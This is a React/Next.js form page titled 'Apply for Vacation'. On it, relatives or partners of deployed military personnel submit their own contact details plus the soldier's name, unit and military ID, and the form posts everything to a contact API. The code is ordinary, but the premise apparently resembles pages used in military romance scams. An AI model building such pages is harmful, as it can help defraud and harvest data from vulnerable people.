"use client";
import { useState } from "react";
import { Info } from "lucide-react";

export default function Apply() {
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    emailAddress: "",
    currentPhoneNumber: "",
    homeAddress: "",
    servingPersonnel: "",
    applicationFor: "",
    servingCountry: "",
    vacationDuration: "",
    fullNameServing: "",
    additionalDetailsServing: "",
    validIdCard: "",
    additionalMessage: "",
    honeypot: "" // Hidden spam prevention field
  });

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState(null); // 'success', 'error', null
  const [validationErrors, setValidationErrors] = useState([]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setSubmitStatus(null);
    setValidationErrors([]);

    // Client-side validation
    const errors = [];
    if (!formData.firstName.trim()) errors.push('First name is required');
    if (!formData.lastName.trim()) errors.push('Last name is required');
    if (!formData.emailAddress.trim()) errors.push('Email address is required');
    
    if (errors.length > 0) {
      setValidationErrors(errors);
      setIsSubmitting(false);
      return;
    }

    try {
      // Prepare email content
      const emailData = {
        firstName: formData.firstName,
        lastName: formData.lastName,
        email: formData.emailAddress,
        phoneNumber: formData.currentPhoneNumber,
        subject: "New Vacation Application Submission",
        message: `
Vacation Application Details:

Personal Information:
- Name: ${formData.firstName} ${formData.lastName}
- Email: ${formData.emailAddress}
- Phone: ${formData.currentPhoneNumber}
- Address: ${formData.homeAddress}

Application Details:
- Serving Personnel: ${formData.servingPersonnel}
- Application For: ${formData.applicationFor}
- Serving Country: ${formData.servingCountry}
- Vacation Duration: ${formData.vacationDuration}

Personnel Information:
- Full Name of Serving Personnel: ${formData.fullNameServing}
- Additional Details: ${formData.additionalDetailsServing}
- Valid ID Card: ${formData.validIdCard}

Additional Message:
${formData.additionalMessage}
        `,
        honeypot: formData.honeypot
      };

      const response = await fetch('/api/contact', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(emailData),
      });

      let result;
      try {
        result = await response.json();
      } catch (jsonError) {
        console.error('Failed to parse JSON response:', jsonError);
        result = { error: 'Invalid response format' };
      }

      console.log('Response status:', response.status);
      console.log('Response result:', result);

      if (response.ok) {
        setSubmitStatus('success');
        // Clear form on success
        setFormData({
          firstName: "",
          lastName: "",
          emailAddress: "",
          currentPhoneNumber: "",
          homeAddress: "",
          servingPersonnel: "",
          applicationFor: "",
          servingCountry: "",
          vacationDuration: "",
          fullNameServing: "",
          additionalDetailsServing: "",
          validIdCard: "",
          additionalMessage: "",
          honeypot: ""
        });
      } else {
        setSubmitStatus('error');
        if (result.details) {
          setValidationErrors(Array.isArray(result.details) ? result.details : [result.error]);
        }
        console.error('Submission error:', result);
      }
    } catch (error) {
      setSubmitStatus('error');
      setValidationErrors(['Network error. Please check your connection and try again.']);
      console.error('Network error:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <>
      {/* Page header */}
      <section className="bg-[#071b3a] text-white py-12 border-b-4 border-[#c9a227]">
        <div className="container">
          <h1 className="text-4xl font-black">Apply for Vacation</h1>
          <p className="mt-3 text-slate-300">Complete the form below to submit an official vacation application.</p>
        </div>
      </section>

      {/* Form */}
      <section className="bg-white py-16">
        <div className="container max-w-3xl mx-auto">
          {/* Info Notice */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-8">
            <div className="flex items-start gap-3">
              <Info className="text-blue-600 mt-0.5 flex-shrink-0" size={20} />
              <div>
                <p className="text-sm text-blue-800">
                  <strong>Who can apply?</strong> Relatives, family lawyers, family representatives, and common-law 
                  partners of serving personnel.
                </p>
              </div>
            </div>
          </div>

          {/* Validation Errors */}
          {validationErrors.length > 0 && (
            <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-8">
              <div className="flex items-start gap-3">
                <div className="text-red-600">✗</div>
                <div>
                  <div className="text-sm font-bold text-red-800">Please fix the following errors:</div>
                  <ul className="text-xs text-red-700 mt-2 ml-4 list-disc">
                    {validationErrors.map((error, index) => (
                      <li key={index}>{error}</li>
                    ))}
                  </ul>
                </div>
              </div>
            </div>
          )}

          {/* Status Messages */}
          {submitStatus === 'success' && (
            <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-8">
              <div className="flex items-center gap-3">
                <div className="text-green-600">✓</div>
                <div>
                  <div className="text-sm font-bold text-green-800">Application Submitted Successfully!</div>
                  <div className="text-xs text-green-700">
                    Your vacation application has been received. You will be contacted via email regarding the status.
                  </div>
                </div>
              </div>
            </div>
          )}

          {submitStatus === 'error' && (
            <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-8">
              <div className="flex items-center gap-3">
                <div className="text-red-600">✗</div>
                <div>
                  <div className="text-sm font-bold text-red-800">Submission Failed</div>
                  <div className="text-xs text-red-700">
                    There was an error submitting your application. Please try again or contact support.
                  </div>
                </div>
              </div>
            </div>
          )}

          <form onSubmit={handleSubmit} className="bg-white border border-slate-200 rounded-lg shadow-sm">
            {/* Honeypot field - hidden from users */}
            <input
              type="text"
              name="honeypot"
              value={formData.honeypot}
              onChange={handleInputChange}
              style={{ display: 'none' }}
              tabIndex={-1}
              autoComplete="off"
            />
            {/* Personal Information */}
            <div className="p-8 border-b border-slate-200">
              <h2 className="text-lg font-bold text-[#071b3a] mb-8 text-center">
                PERSONAL INFORMATION
              </h2>
              
              <div className="grid gap-6 md:grid-cols-2">
                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    First Name <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="text"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                    required
                  />
                </div>
                
                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Last Name <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="text"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                    required
                  />
                </div>

                <div className="md:col-span-2">
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Email Address <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="email"
                    name="emailAddress"
                    value={formData.emailAddress}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                    required
                  />
                </div>

                <div className="md:col-span-2">
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Current Phone Number
                  </label>
                  <input
                    type="tel"
                    name="currentPhoneNumber"
                    value={formData.currentPhoneNumber}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                  />
                </div>

                <div className="md:col-span-2">
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Home / Residential Address
                  </label>
                  <textarea
                    name="homeAddress"
                    value={formData.homeAddress}
                    onChange={handleInputChange}
                    rows={3}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 resize-none"
                  />
                </div>
              </div>
            </div>

            {/* Application Details */}
            <div className="p-8 border-b border-slate-200">
              <h2 className="text-lg font-bold text-[#071b3a] mb-8 text-center">
                APPLICATION DETAILS
              </h2>
              
              <div className="space-y-6">
                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Are you a serving personnel?
                  </label>
                  <div className="flex gap-4">
                    <label className="flex items-center">
                      <input
                        type="radio"
                        name="servingPersonnel"
                        value="Yes"
                        checked={formData.servingPersonnel === "Yes"}
                        onChange={handleInputChange}
                        className="mr-2"
                      />
                      Yes
                    </label>
                    <label className="flex items-center">
                      <input
                        type="radio"
                        name="servingPersonnel"
                        value="No"
                        checked={formData.servingPersonnel === "No"}
                        onChange={handleInputChange}
                        className="mr-2"
                      />
                      No
                    </label>
                  </div>
                </div>

                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Who is this application for?
                  </label>
                  <select
                    name="applicationFor"
                    value={formData.applicationFor}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 bg-white"
                  >
                    <option value="">Select relationship...</option>
                    <option value="spouse">Spouse</option>
                    <option value="child">Child</option>
                    <option value="parent">Parent</option>
                    <option value="sibling">Sibling</option>
                    <option value="other">Other Family Member</option>
                  </select>
                </div>

                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Serving in which country?
                  </label>
                  <select
                    name="servingCountry"
                    value={formData.servingCountry}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 bg-white"
                  >
                    <option value="">Select country...</option>
                    <option value="afghanistan">Afghanistan</option>
                    <option value="syria">Syria</option>
                    <option value="iraq">Iraq</option>
                    <option value="mali">Mali</option>
                    <option value="other">Other</option>
                  </select>
                </div>

                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Vacation Duration
                  </label>
                  <select
                    name="vacationDuration"
                    value={formData.vacationDuration}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 bg-white"
                  >
                    <option value="">Select duration...</option>
                    <option value="2weeks">2 Weeks</option>
                    <option value="1month">1 Month</option>
                    <option value="2months">2 Months</option>
                    <option value="3months">3 Months</option>
                  </select>
                </div>
              </div>
            </div>

            {/* Personnel Information */}
            <div className="p-8 border-b border-slate-200">
              <h2 className="text-lg font-bold text-[#071b3a] mb-8 text-center">
                PERSONNEL INFORMATION
              </h2>
              
              <div className="space-y-6">
                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Full Name of Serving Personnel
                  </label>
                  <input
                    type="text"
                    name="fullNameServing"
                    value={formData.fullNameServing}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Additional Details of Serving Personnel
                  </label>
                  <textarea
                    name="additionalDetailsServing"
                    value={formData.additionalDetailsServing}
                    onChange={handleInputChange}
                    rows={3}
                    placeholder="Rank, unit, ID number, deployment details..."
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 resize-none"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Valid ID Card Number (Military ID)
                  </label>
                  <input
                    type="text"
                    name="validIdCard"
                    value={formData.validIdCard}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Additional Message
                  </label>
                  <textarea
                    name="additionalMessage"
                    value={formData.additionalMessage}
                    onChange={handleInputChange}
                    rows={4}
                    placeholder="Any additional information relevant to this application..."
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 resize-none"
                  />
                </div>
              </div>
            </div>

            {/* Submit Button */}
            <div className="p-8 text-center">
              <button
                type="submit"
                disabled={isSubmitting}
                className={`px-8 py-3 rounded font-bold text-white transition-colors ${
                  isSubmitting 
                    ? 'bg-gray-400 cursor-not-allowed' 
                    : 'bg-[#0b8fe0] hover:bg-[#0a7fc9]'
                }`}
              >
                {isSubmitting ? 'SUBMITTING...' : 'SUBMIT APPLICATION'}
              </button>
            </div>
          </form>
        </div>
      </section>
    </>
  );
}